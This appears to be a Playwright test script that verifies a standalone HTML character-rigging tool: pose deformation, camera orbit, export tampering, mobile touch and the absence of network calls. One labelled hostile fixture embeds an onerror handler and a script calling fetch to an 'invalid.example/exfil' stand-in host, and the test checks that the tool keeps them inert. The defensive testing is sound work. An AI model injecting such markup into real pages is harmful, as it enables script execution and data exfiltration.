"""Run exact delivered bytes. No painted screenshots or mocked rig.
Managed Chromium blocks URL navigation here; IndexedDB origin-reload is explicitly
NOT marked verified. Portable export/reimport is exercised using real downloads.
"""
from pathlib import Path
import json, hashlib, os
from playwright.sync_api import sync_playwright
ROOT=Path(__file__).resolve().parents[2]
HTML=ROOT/'Shadowveil_Character_Driver_Foundation.html'
OUT=Path(os.environ.get('DRIVER_EVIDENCE',str(ROOT/'verification-driver')));OUT.mkdir(parents=True,exist_ok=True)
report={'htmlSha256':hashlib.sha256(HTML.read_bytes()).hexdigest(),'checks':[],'errors':[],'networkRequests':[], 'environment':{'browser':'Chromium','navigation':'Exact HTML via set_content; managed navigation blocked','physicalAndroid':False,'originIndexedDBReloadVerified':False,'fullViteProductionBuild':False}}
def check(name,value,detail=None):
 item={'name':name,'pass':bool(value)}
 if detail is not None:item['detail']=detail
 report['checks'].append(item);print(('PASS' if value else 'FAIL'),name,flush=True)
def wait(page):page.wait_for_timeout(400)
def metrics(page):return page.evaluate('characterDriver.metrics()')
def project(page):return page.evaluate('characterDriver.getProject()')
def art_hash(page):return page.evaluate('''()=>{const c=characterDriver.canvas,d=c.getContext('2d').getImageData(0,0,c.width,c.height).data;let h=2166136261;for(const a of d){h=Math.imul(h^a,16777619);}return h>>>0;}''')
def screen_joint(page,bone):return page.evaluate('''id=>{const c=characterDriver.canvas,r=c.getBoundingClientRect(),m=characterDriver.metrics(),p=m.world[id].position,s=Math.min(r.width/690,Math.max(120,r.height-40)/1100)*.97*m.camera.zoom,x=r.width/2-256*s,y=(r.height-40-1100*s)/2+4;return{x:r.left+(p.x+258.8)*s+x,y:r.top+(527-p.y)*s+y};}''',bone)
try:
 with sync_playwright() as p:
  b=p.chromium.launch(executable_path=os.environ.get('CHROMIUM_EXECUTABLE','/usr/bin/chromium'),headless=True,args=['--no-sandbox','--disable-dev-shm-usage'])
  context=b.new_context(viewport={'width':1440,'height':1100},accept_downloads=True)
  page=context.new_page();page.on('pageerror',lambda e:report['errors'].append(str(e)));page.on('console',lambda m:report['errors'].append(m.text) if m.type=='error' else None);page.on('request',lambda r:report['networkRequests'].append(r.url) if r.url.startswith(('http:','https:')) else None)
  page.set_content(HTML.read_text(),wait_until='load');page.wait_for_function('window.driverReady===true',timeout=30000);wait(page)
  m=metrics(page);report['startup']=m
  check('Exact build starts with 21 hidden-driver bones and one canvas',m['rigBones']==21 and page.locator('canvas').count()==1)
  check('Driver overlay is off by default and no definitive guide is claimed',not project(page)['workspace']['showDriver'] and project(page)['activeGuideId'] is None)
  check('Existing numeric skin weights are loaded',m['weights']['weightsNormalized'] and m['weights']['vertices']==12692)
  check('Neutral bindings reconstruct without strain or separated welds',abs(m['shape']['minScale']-1)<1e-9 and abs(m['shape']['maxScale']-1)<1e-9 and m['shape']['seamGap']==0)
  page.screenshot(path=str(OUT/'01-foundation-desktop.png'))
  basehash=art_hash(page);page.evaluate("characterDriver.setAngle('upper-R','x',8)");wait(page);m=metrics(page)
  check('Out-of-plane joint rotation produces real depth and changes 2D artwork',abs(m['world']['hand-R']['position']['z'])>10 and art_hash(page)!=basehash and m['coverage']['supported'])
  pose_before=project(page)['pose'];world_before=m['world'];shape_before=m['shape']
  page.evaluate('characterDriver.setCamera({yaw:90,pitch:20})');wait(page);m=metrics(page)
  check('Camera orbit preserves driver pose and transforms',project(page)['pose']==pose_before and m['world']==world_before)
  check('Structural strain is invariant to camera',m['shape']==shape_before)
  check('Unsupported art angle explicitly withholds the front drawing',not m['coverage']['supported'] and page.locator('.cd-unsupported').is_visible())
  page.evaluate('characterDriver.setOverlay(true)');wait(page);page.screenshot(path=str(OUT/'02-driver-side-no-art.png'))
  page.evaluate('characterDriver.setCamera({yaw:0,pitch:0});characterDriver.setOverlay(false)');wait(page)
  check('Returning front restores same artwork while retaining pose',m['world']==metrics(page)['world'] and metrics(page)['coverage']['supported'])
  page.click('[data-action="neutral"]');page.click('[data-action="gesture"]');wait(page);m=metrics(page)
  check('Gentle pose deforms actual inherited art with connected attachments',m['shape']['accepted'] and m['shape']['seamGap']<.03 and art_hash(page)!=basehash,m['shape'])
  page.screenshot(path=str(OUT/'03-gentle-lift-art.png'))
  pose_before=project(page)['pose'];hashes=[]
  for diag in ['art','weights','seams']:
   page.evaluate('(d)=>characterDriver.setDiagnostic(d)',diag);wait(page);hashes.append(art_hash(page));assert project(page)['pose']==pose_before
  check('Weight and seam overlays use same pose but distinct pixels',len(set(hashes))==3)
  page.evaluate("characterDriver.setDiagnostic('weights');characterDriver.setOverlay(true)");wait(page);page.screenshot(path=str(OUT/'04-weights-driver.png'))
  page.evaluate("characterDriver.setDiagnostic('art');characterDriver.setOverlay(false)");page.click('[data-action="neutral"]');wait(page)
  page.evaluate("characterDriver.setAngle('forearm-R','z',-95)");wait(page);m=metrics(page)
  check('Surface-damaging request is stopped at accepted geometry',m['shape']['accepted'] and m['shape']['minScale']>=.6 and m['shape']['maxScale']<=1.5)
  before=project(page);page.evaluate('characterDriver.undo()');wait(page);check('Undo restores preceding pose',project(page)['pose']!=before['pose'])
  page.evaluate('characterDriver.setCamera({yaw:8,pitch:3})');page.select_option('[data-bone]','head');page.evaluate("characterDriver.setAngle('head','z',4)");wait(page)
  saved=project(page)
  with page.expect_download() as dl:page.click('[data-action="export"]')
  download=dl.value;export_path=OUT/'test-export.character.json';download.save_as(export_path);exported=export_path.read_text()
  check('Real project download includes seed PNGs and numeric weights',download.suggested_filename=='Shadowveil.character.json' and 'skin-weights.json' in exported and 'data:image/png;base64,' in exported)
  page.click('[data-action="neutral"]');page.evaluate('characterDriver.setCamera({yaw:90})');page.evaluate('(text)=>characterDriver.importProject(text)',exported);wait(page)
  check('Portable project restores exact pose, camera, selection and identity',project(page)==saved)
  text=exported.replace('"sha256": "','"sha256": "bad',1);snap=project(page)
  result=page.evaluate('async t=>{try{await characterDriver.importProject(t);return false}catch{return true}}',text)
  check('Tampered export is rejected without mutating project',result and project(page)==snap)
  # A deliberately hostile fixture. Stored only as inert text, not inserted as HTML.
  guide='''<!DOCTYPE html><html><head><title>TEST FIXTURE — not the definitive guide</title></head><body><h1>Guide import test</h1><img src="https://invalid.example/should-not-load" onerror="window.GUIDE_EXECUTED=1"><script>window.GUIDE_EXECUTED=2;fetch('https://invalid.example/exfil')</script><script id="character-driver-guide" type="application/json">{"schema":"character-driver-guide/1","characterId":"shadowveil","revision":"test-fixture-only","notes":"Never approve as production design."}</script></body></html>'''
  pose_before=project(page)['pose'];rig_before=project(page)['driver'];req_before=len(report['networkRequests'])
  page.evaluate('(html)=>characterDriver.importGuide(html,"TEST-FIXTURE.html")',guide);wait(page);d=project(page)
  check('HTML guide is staged without changing rig, pose or active guide',len(d['guides'])==1 and d['activeGuideId'] is None and d['pose']==pose_before and d['driver']==rig_before)
  check('Structured metadata parsed but not applied',d['guides'][0]['machine']['revision']=='test-fixture-only')
  check('Guide scripts, handlers and remote images are never activated',page.evaluate('typeof window.GUIDE_EXECUTED')=='undefined' and len(report['networkRequests'])==req_before)
  page.evaluate('(id)=>characterDriver.approveGuide(id)',d['guides'][0]['id']);wait(page);new=project(page)
  check('Explicit approval invalidates bindings without auto-fitting',new['registration']['status']=='needs-review' and new['driver']==rig_before and new['pose']==pose_before and not metrics(page)['coverage']['supported'])
  page.evaluate('characterDriver.undo()');wait(page);check('Guide approval can be undone to previous registration',project(page)['registration']['status']=='provisional' and project(page)['activeGuideId'] is None)
  page.evaluate('characterDriver.undo()');wait(page);check('Staged guide can be undone without losing pose',len(project(page)['guides'])==0 and project(page)['pose']==pose_before)
  check('12-art queue is planning only, not false production output',len(project(page)['queue'])==12 and all(t['status']=='awaiting-guide' for t in project(page)['queue']))
  if not metrics(page)['storageAvailable']:
   failed=page.evaluate('async()=>{try{await characterDriver.save();return false}catch{return true}}')
   check('Unavailable origin storage is reported, never labeled saved',failed and 'Not saved locally' in page.locator('[data-storage]').inner_text())
  # Actual browser touch, not direct calls to the pose solver.
  mobile=b.new_context(viewport={'width':412,'height':915},device_scale_factor=1,is_mobile=True,has_touch=True,accept_downloads=True)
  mp=mobile.new_page();mp.on('pageerror',lambda e:report['errors'].append('mobile: '+str(e)));mp.set_content(HTML.read_text(),wait_until='load');mp.wait_for_function('window.driverReady===true');wait(mp)
  check('Mobile layout has no horizontal overflow',mp.evaluate('document.documentElement.scrollWidth<=innerWidth'))
  mp.evaluate('characterDriver.setOverlay(true)');wait(mp);xy=screen_joint(mp,'forearm-R');cdp=mobile.new_cdp_session(mp);p0=project(mp)['pose']
  cdp.send('Input.dispatchTouchEvent',{'type':'touchStart','touchPoints':[{'x':xy['x'],'y':xy['y']}]});wait(mp)
  check('Actual mobile touch-down selects joint without snapping',project(mp)['pose']==p0 and project(mp)['workspace']['selectedBone']=='forearm-R')
  cdp.send('Input.dispatchTouchEvent',{'type':'touchMove','touchPoints':[{'x':xy['x']+35,'y':xy['y']}]});cdp.send('Input.dispatchTouchEvent',{'type':'touchEnd','touchPoints':[]});wait(mp)
  check('Actual mobile drag updates accepted driver pose',project(mp)['pose']!=p0 and metrics(mp)['shape']['accepted'])
  mp.screenshot(path=str(OUT/'05-mobile-touch.png'))
  mp.evaluate('characterDriver.setOverlay(false)');mp.screenshot(path=str(OUT/'06-mobile-art.png'))
  check('No uncaught runtime errors',not report['errors'],report['errors'])
  check('Standalone made no external network requests',not report['networkRequests'])
  report['finalMetrics']=metrics(page);b.close()
except Exception as e:
 report['exception']=str(e);raise
finally:
 report['passed']=sum(c['pass'] for c in report['checks']);report['total']=len(report['checks']);(OUT/'browser-results.json').write_text(json.dumps(report,indent=2));print('RESULT',report['passed'],'/',report['total'])
 if any(not c['pass'] for c in report['checks']):raise SystemExit(1)
